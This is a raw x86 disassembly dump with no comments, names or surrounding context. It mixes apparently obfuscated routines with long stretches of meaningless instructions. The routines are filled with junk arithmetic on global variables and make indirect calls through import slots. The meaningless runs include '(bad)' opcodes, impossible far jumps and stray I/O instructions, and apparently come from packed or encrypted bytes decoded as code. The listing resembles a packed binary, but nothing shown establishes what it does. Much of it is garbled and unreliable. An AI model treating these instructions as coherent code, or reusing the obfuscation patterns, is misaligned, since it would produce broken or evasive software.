  416750:	pop    ecx
  416751:	push   esp
  416752:	pushf  
  416753:	enter  0xfee2,0x6f
  416757:	rcl    BYTE PTR [ebp+0x1838ecf2],0xa2
  41675e:	repnz push edx
  416760:	and    DWORD PTR [esi+ebp*4-0x36],edx
  416764:	in     al,0xaa
  416766:	inc    edx
  416767:	cwde   
  416768:	fdivr  QWORD PTR [ebx+0x4c]
  41676b:	adc    edi,edi
  41676d:	jmp    0x416721
  41676f:	fmul   DWORD PTR [ebx-0x70]
  416772:	sbb    dl,BYTE PTR cs:[ecx]
  416775:	dec    ebx
  416776:	fldenv [edx+0x5e]
  416779:	mov    DWORD PTR [ecx-0x42],0x8b1a0488
  416780:	inc    ebp
  416781:	enter  0x4503,0xc4
  416785:	mov    edx,DWORD PTR [ebp-0x40]
  416788:	xor    eax,edx
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422514
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422500
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x4284f5,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428509,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x428475,0x96c
  416847:	cmp    DWORD PTR ds:0x4284f5,0x0
  41684e:	jbe    0x416866
  416854:	push   0x4280e7
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428505
  416866:	and    DWORD PTR ds:0x428469,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x4283c9
  416876:	sub    ecx,DWORD PTR ds:0x4284a1
  41687c:	mov    DWORD PTR ds:0x4283c9,ecx
  416882:	mov    ecx,DWORD PTR ds:0x4228c8
  416888:	and    DWORD PTR ds:0x428315,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428505,0x428479
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x4283fd,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x4282e9,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x4283bd,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x4282f5,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x4283fd,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42841d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x4283bd
  4168f9:	movzx  eax,WORD PTR ds:0x428419
  416900:	cmp    DWORD PTR ds:0x4283bd,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428519
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x4282d5,0x4283bd
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428305,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x4284ed,0x428509
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x4283b1,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428415
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x4283fd
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428501,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x4283ad,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x4283e5,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x4282fd,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x4282cd,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x4282f1
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	dec    ecx
  416a2e:	sbb    bh,al
  416a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a31:	or     al,0xd4
  416a33:	sar    BYTE PTR [esi-0x41413dcb],0x28
  416a3a:	or     DWORD PTR [ebp+0x309aa193],ebx
  416a40:	xchg   esp,eax
  416a41:	jmp    0xc6490e49
  416a46:	pop    ss
  416a47:	dec    eax
  416a48:	mov    esp,0xbdcb40
  416a4d:	enter  0x2517,0xe2
  416a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a52:	jmp    0x416a70
  416a54:	(bad)  
  416a55:	xchg   ecx,eax
  416a56:	sbb    al,0xd5
  416a58:	iret   
  416a59:	adc    al,0xfb
  416a5b:	mov    al,0xec
  416a5d:	loopne 0x416a0d
  416a5f:	dec    edx
  416a60:	push   esi
  416a61:	and    al,bl
  416a63:	(bad)  
  416a65:	(bad)  
  416a67:	jge    0x416a54
  416a69:	imul   ebp,edi,0x70a195fb
  416a6f:	ss scas al,BYTE PTR es:[edi]
  416a71:	add    ebp,DWORD PTR [ecx+0x62]
  416a74:	clc    
  416a75:	ret    0x68ac
  416a78:	inc    ebx
  416a79:	in     al,dx
  416a7a:	pop    esi
  416a7b:	dec    ecx
  416a7c:	imul   ebx,DWORD PTR ds:0x653fbdd1,0xd033ee7d
  416a86:	push   ss
  416a87:	xchg   ecx,eax
  416a88:	push   ebx
  416a89:	(bad)  
  416a8a:	fldcw  WORD PTR [edx]
  416a8c:	retf   
  416a8d:	loop   0x416a4a
  416a8f:	mov    ebp,0xa65891ee
  416a94:	mov    dh,0x6b
  416a96:	test   eax,0x7064db01
  416a9b:	or     al,0x35
  416a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a9e:	std    
  416a9f:	lahf   
  416aa0:	mov    ds,WORD PTR [edi+0x4b]
  416aa3:	dec    esi
  416aa4:	retf   0x971f
  416aa7:	in     al,0x55
  416aa9:	out    0xe4,eax
  416aab:	or     dh,ch
  416aad:	imul   ebx,DWORD PTR [edi],0xffffffab
  416ab0:	ret    0xcc9
  416ab3:	scas   al,BYTE PTR es:[edi]
  416ab4:	mov    ebx,0x6108fa0c
  416ab9:	add    eax,0x8cb094da
  416abe:	mov    al,0x83
  416ac0:	stc    
  416ac1:	dec    ebp
  416ac2:	jnp    0x416b02
  416ac4:	shr    DWORD PTR [esi+0x4d],0x8e
  416ac8:	jge    0x416b44
  416aca:	push   eax
  416acb:	lods   al,BYTE PTR ds:[esi]
  416acc:	js     0x416b3c
  416ace:	out    0x4,eax
  416ad0:	ja     0x416abd
  416ad2:	inc    ecx
  416ad3:	xchg   ebx,eax
  416ad4:	ss je  0x416b19
  416ad7:	push   0x9fc54a10
  416adc:	jb     0x416b5a
  416ade:	mov    ebp,0xdb05bc8d
  416ae3:	ja     0x416b0c
  416ae5:	or     DWORD PTR [edi+0x563b1414],esp
  416aeb:	mov    ds:0x53febb60,al
  416af0:	call   0xd31252b8
  416af5:	sbb    BYTE PTR [ebx-0x6a],cl
  416af8:	push   esp
  416af9:	jmp    0x993fc05c
  416afe:	jno    0x416ace
  416b00:	mov    bh,0x59
  416b02:	icebp  
  416b03:	mov    ah,al
  416b05:	add    esi,DWORD PTR [edx]
  416b07:	dec    ebp
  416b08:	inc    ecx
  416b09:	pop    edx
  416b0a:	inc    BYTE PTR [eax]
  416b0c:	push   0x703f2cd4
  416b11:	sar    DWORD PTR [edx],0x33
  416b14:	sub    ebp,0xd4dfcbf2
  416b1a:	push   eax
  416b1b:	xchg   esp,eax
  416b1c:	lods   al,BYTE PTR ds:[esi]
  416b1d:	xchg   edx,eax
  416b1e:	(bad)
  416b21:	sbb    DWORD PTR [ecx-0x5a],eax
  416b24:	nop
  416b25:	repnz sbb dh,BYTE PTR [ebx-0x2790f03b]
  416b2c:	and    DWORD PTR [esi-0x1411c407],esp
  416b32:	fidiv  DWORD PTR [esi-0x13]
  416b35:	jno    0x416ba1
  416b37:	je     0x416b49
  416b39:	stos   BYTE PTR es:[edi],al
  416b3a:	in     al,0x39
  416b3c:	inc    eax
  416b3d:	bound  ebp,QWORD PTR [ebx+0x4019e7f4]
  416b43:	mov    ecx,0x129a82b4
  416b48:	addr16 xchg esi,eax
  416b4a:	push   edi
  416b4b:	push   0x118401ba
  416b50:	mov    cl,0x8e
  416b52:	rol    BYTE PTR [esi+0x7],1
  416b55:	repnz scas eax,DWORD PTR es:[edi]
  416b57:	mov    ah,0x87
  416b59:	repz xchg edi,eax
  416b5b:	jmp    0x1fe38b9b
  416b60:	xor    edx,DWORD PTR [ebx+0x468b15a4]
  416b66:	jae    0x416b80
  416b68:	in     al,dx
  416b69:	mov    DWORD PTR [ebp+0x25964937],ebx
  416b6f:	nop
  416b70:	mov    ecx,0xa6637b10
  416b75:	scas   eax,DWORD PTR es:[edi]
  416b76:	pusha  
  416b77:	push   edi
  416b78:	xchg   esp,eax
  416b79:	xlat   BYTE PTR gs:[ebx]
  416b7b:	mov    al,BYTE PTR [eax]
  416b7d:	cmp    DWORD PTR [esp],eax
  416b80:	jg     0x416b94
  416b82:	scas   al,BYTE PTR es:[edi]
  416b83:	fwait
  416b84:	mov    eax,0xb2dcc2b4
  416b89:	sbb    esp,ecx
  416b8b:	mov    ds:0x4c224bf,eax
  416b90:	hlt    
  416b91:	in     eax,dx
  416b92:	call   0x5c68:0xb81e9baa
  416b99:	ds ror eax,0xbb
  416b9d:	inc    ebp
  416b9e:	sbb    eax,0x7fc4115b
  416ba3:	sar    ch,cl
  416ba5:	outs   dx,DWORD PTR ds:[esi]
  416ba6:	ficom  WORD PTR [ebx+0x11]
  416ba9:	nop
  416baa:	test   al,0xdd
  416bac:	test   al,0xfd
  416bae:	(bad)  
  416baf:	mov    bh,0x70
  416bb1:	push   esp
  416bb2:	nop    esi
  416bb5:	stos   DWORD PTR es:[edi],eax
  416bb6:	dec    ebx
  416bb7:	and    eax,DWORD PTR [edx+0x7418df9f]
  416bbd:	xor    eax,0xb70a37b8
  416bc2:	outs   dx,DWORD PTR ds:[esi]
  416bc3:	(bad)  
  416bc4:	std    
  416bc5:	dec    esi
  416bc6:	sub    ah,BYTE PTR [ebp-0x3b]
  416bc9:	in     eax,0x74
  416bcb:	in     eax,dx
  416bcc:	loop   0x416b7e
  416bce:	push   edx
  416bcf:	mov    edi,DWORD PTR [ebp-0x5aa2c5ad]
  416bd5:	(bad)  
  416bd6:	and    BYTE PTR [ebx+eax*2-0x23dafc73],ch
  416bdd:	mov    ss,edi
  416bdf:	mov    al,ds:0xffd1c968
  416be4:	fiadd  WORD PTR [edi+esi*8+0x46e70777]
  416beb:	mov    al,ds:0xfa81a294
  416bf0:	pop    edi
  416bf1:	adc    al,ah
  416bf3:	out    0x27,eax
  416bf5:	das    
  416bf6:	lahf   
  416bf7:	cdq    
  416bf8:	pop    ecx
  416bf9:	sbb    edi,DWORD PTR [esi+0x46]
  416bfc:	data16 fisttp WORD PTR [esi+0x23451edd]
  416c03:	xor    DWORD PTR [edi+edx*1-0x8ba0ef],ebx
  416c0a:	jne    0x416c6a
  416c0c:	inc    ebx
  416c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c0e:	arpl   WORD PTR [edx-0x71],bx
  416c11:	test   BYTE PTR [ebx],0x53
  416c14:	push   0x6853fd2c
  416c19:	retf   0xd6d
  416c1c:	xor    BYTE PTR [esp+ebp*1-0x38dbc4b],cl
  416c23:	int3   
  416c24:	push   0x21
  416c26:	jp     0x416c73
  416c28:	inc    edx
  416c29:	jl     0x416c62
  416c2b:	sub    edi,DWORD PTR [ecx+0x25b16957]
  416c31:	pop    edx
  416c32:	sub    bh,BYTE PTR [edx]
  416c34:	push   ecx
  416c35:	scas   eax,DWORD PTR es:[edi]
  416c36:	enter  0x47c5,0xdf
  416c3a:	test   eax,0x457b84eb
  416c3f:	dec    esp
  416c40:	lea    ebx,[eax]
  416c42:	sbb    dl,0xa8
  416c45:	stos   BYTE PTR es:[edi],al
  416c46:	or     DWORD PTR [ebx],0xffffffed
  416c49:	stos   DWORD PTR es:[edi],eax
  416c4a:	xchg   edx,eax
  416c4b:	xchg   BYTE PTR [ebx-0x72296379],bl
  416c51:	sti    
  416c52:	retf   0x8dc6
  416c55:	lds    ecx,FWORD PTR [ecx+edi*8-0x50]
  416c59:	cwde   
  416c5a:	sbb    al,0x5a
  416c5c:	xchg   ebp,eax
  416c5d:	mov    ebx,0x3589e558
  416c62:	cmp    ch,bl
  416c64:	fistp  QWORD PTR [ecx-0x44]
  416c67:	aas    
  416c68:	mov    eax,ds:0xac3b4689
  416c6d:	sbb    BYTE PTR ds:0xf83f08d0,0x9f
  416c74:	pop    ecx
  416c75:	ins    DWORD PTR es:[edi],dx
  416c76:	ret    
  416c77:	lods   eax,DWORD PTR ds:[esi]
  416c78:	mov    al,ds:0x502444c7
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x4283d1
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x4283d9,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x428491,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x428475,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x4282f9,0x0
  416d09:	mov    DWORD PTR ds:0x4282e1,edi
  416d0f:	mov    DWORD PTR ds:0x4283e5,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x42849d,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x4283b9,0xa9d
  416d37:	cmp    DWORD PTR ds:0x4282f9,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428501,0x42830d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428305
  416d72:	adc    DWORD PTR ds:0x4283d9,ecx
  416d78:	cmp    DWORD PTR ds:0x4284f5,0x0
  416d7f:	mov    DWORD PTR ds:0x428519,edi
  416d85:	mov    DWORD PTR ds:0x428519,ebx
  416d8b:	mov    DWORD PTR ds:0x4283ad,0x662b
  416d95:	mov    DWORD PTR ds:0x428501,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x4282f5,ebx
  416daa:	cmp    DWORD PTR ds:0x4284f5,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x42817b
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x4284d1
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42850d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x4284f1
  416de1:	and    DWORD PTR ds:0x428401,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x4282f9
  416df3:	add    DWORD PTR ds:0x4282dd,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428309,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x428421,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x4282f1,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x4283d1
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x4284ed,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x4284e5
  416e57:	mov    ecx,DWORD PTR ds:0x428421
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x4283f1,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x4284ed,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x4283b1,edi
  416e87:	and    DWORD PTR ds:0x428311,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x4283e1
  416e97:	or     DWORD PTR ds:0x428515,ecx
  416e9d:	add    DWORD PTR ds:0x428481,ebx
  416ea3:	or     DWORD PTR ds:0x428471,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428305
  416eb3:	sub    DWORD PTR ds:0x428469,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428315,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x4283ad,0x0
  416ecf:	mov    DWORD PTR ds:0x4282d1,0x5921
  416ed9:	mov    DWORD PTR ds:0x428481,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x4283ad,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x4282f1
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x428471,0x2a49
  416f10:	and    DWORD PTR ds:0x428501,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x4283fd
  416f21:	adc    DWORD PTR ds:0x428415,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x4284e5
  416f2d:	adc    DWORD PTR ds:0x4283c1,ecx
  416f33:	or     DWORD PTR ds:0x428301,0x75b4
  416f3d:	adc    DWORD PTR ds:0x428465,edx
  416f43:	or     DWORD PTR ds:0x42849d,0x469c
  416f4d:	or     DWORD PTR ds:0x4283f9,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428401,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x4283c1
  416f70:	or     ecx,DWORD PTR ds:0x4284a1
  416f76:	mov    DWORD PTR ds:0x4283c1,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x4284f5,0x4284f1
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428315,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x4283a5,0x4283e5
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x4284f1,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x4282e9,0x4282cd
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x4282cd,0x428305
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x4283f9,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42830d,0x4282cd
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x4283c5,0x428495
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x428471,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x4283f1,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x428475,0x0
  417044:	not    DWORD PTR ds:0x4283b9
  41704a:	mov    DWORD PTR ds:0x42847d,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x4282fd
  417060:	cmp    DWORD PTR ds:0x428475,0x0
  417067:	jae    0x41709b
  41706d:	push   0x428155
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x4282d9,edi
  417091:	xor    DWORD PTR ds:0x4283f9,0x58f
  41709b:	sbb    DWORD PTR ds:0x42840d,ecx
  4170a1:	sub    DWORD PTR ds:0x428501,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x42837d
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x428521,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428401
  4170c0:	add    esi,DWORD PTR ds:0x4284a1
  4170c6:	mov    DWORD PTR ds:0x428401,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42830d,0x4283e1
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x41709d
  417104:	add    al,0x72
  417106:	fld    QWORD PTR [eax+ebx*8-0x3dca4140]
  41710d:	mov    esi,0x95e2e6be
  417112:	mov    cl,BYTE PTR ds:0xcffd4651
  417118:	push   esi
  417119:	stos   DWORD PTR es:[edi],eax
  41711a:	in     al,0xbb
  41711c:	pusha  
  41711d:	and    esi,DWORD PTR [edx+0x181742d]
  417123:	mov    ecx,0x7db12d93
  417128:	aas    
  417129:	popf   
  41712a:	test   DWORD PTR [edi-0x1b58ea46],0xc7bb1712
  417134:	or     BYTE PTR [esi-0x6901cae4],bl
  41713a:	mov    ecx,0x2e87250c
  41713f:	cmp    BYTE PTR [esi+ebp*1],cl
  417142:	aaa    
  417143:	mov    edi,0xe105afb5
  417148:	mov    ebx,0x4c6314b7
  41714d:	push   ss
  41714e:	js     0x4171c1
  417150:	fcomp  QWORD PTR [edx+edx*1]
  417153:	aaa    
  417154:	pop    ebx
  417155:	push   esp
  417156:	addr16 test eax,0xda7d055c
  41715c:	sub    eax,0xef23713d
  417161:	out    dx,eax
  417162:	adc    dl,BYTE PTR [ecx-0x49bfb8a4]
  417168:	je     0x41718c
  41716a:	inc    esi
  41716b:	(bad)  
  41716c:	xchg   esp,eax
  41716d:	test   esp,edi
  41716f:	and    ch,BYTE PTR [ecx+0x4437543f]
  417175:	xchg   DWORD PTR [eax-0x48],ebp
  417178:	cmp    ch,dl
  41717a:	push   0xc5f6ad49
  41717f:	retf   0x5608
  417182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417183:	mov    ah,0xde
  417185:	js     0x41711c
  417187:	mov    bh,bh
  417189:	cmp    ecx,DWORD PTR [eax-0x144c6530]
  41718f:	xchg   BYTE PTR [eax+0xad2eb02],ch
  417195:	inc    ecx
  417196:	add    bh,cl
  417198:	adc    DWORD PTR [esp+eiz*2+0x62a548f8],ecx
  41719f:	add    eax,0x963f20ba
  4171a4:	sahf   
  4171a5:	mov    ecx,esi
  4171a7:	loope  0x417146
  4171a9:	sub    esi,DWORD PTR [ecx]
  4171ab:	ror    edi,1
  4171ad:	xchg   esp,eax
  4171ae:	pop    edx
  4171af:	in     al,dx
  4171b0:	add    bh,ah
  4171b2:	cmp    bh,BYTE PTR [edx+0x23]
  4171b5:	adc    ch,cl
  4171b7:	push   0xaba5793a
  4171bc:	jle    0x4171e6
  4171be:	cmp    BYTE PTR [ebx+0x25a6248b],bl
  4171c4:	ja     0x417244
  4171c6:	xchg   edi,eax
  4171c7:	sub    BYTE PTR [eax],al
  4171c9:	retf   0x5827
  4171cc:	sbb    eax,0x4ced3e48
  4171d1:	in     eax,0xa0
  4171d3:	sub    al,0xc7
  4171d5:	je     0x4171ba
  4171d7:	icebp  
  4171d8:	bound  ebx,QWORD PTR [ecx+0xb]
  4171db:	fsub   st(1),st
  4171dd:	leave  
  4171de:	aad    0xa0
  4171e0:	cdq    
  4171e1:	add    bh,BYTE PTR [edi]
  4171e3:	inc    ebp
  4171e4:	les    ebp,FWORD PTR [ebx+0x1a]
  4171e7:	repnz cmp BYTE PTR [edi+ebx*8],ch
  4171eb:	je     0x4171f0
  4171ed:	not    DWORD PTR [di+0x64de]
  4171f2:	dec    edi
  4171f3:	adc    edx,DWORD PTR [esi]
  4171f5:	sub    al,0xab
  4171f7:	pop    ebx
  4171f8:	inc    ebx
  4171f9:	test   bl,0x8e
  4171fc:	ds cld 
  4171fe:	shr    DWORD PTR [esi],1
  417200:	call   0x2195:0xe1267ba7
  417207:	jle    0x4171a4
  417209:	dec    BYTE PTR [edx]
  41720b:	add    al,BYTE PTR [ebx-0xa]
  41720e:	push   esp
  41720f:	ror    BYTE PTR [eax+eax*4],1
  417212:	jmp    0x900c:0xab90612e
  417219:	data16 sub ah,al
  41721c:	loope  0x41723c
  41721e:	in     al,dx
  41721f:	lahf   
  417220:	inc    eax
  417221:	pop    ds
  417222:	or     ebx,esp
  417224:	or     DWORD PTR [ecx+ecx*2-0x37],esp
  417228:	jne    0x4171f1
  41722a:	mov    esp,0x2f29edb9
  41722f:	out    0xb5,al
  417231:	test   BYTE PTR [edx],0x4a
  417234:	jge    0x41727b
  417236:	pop    ecx
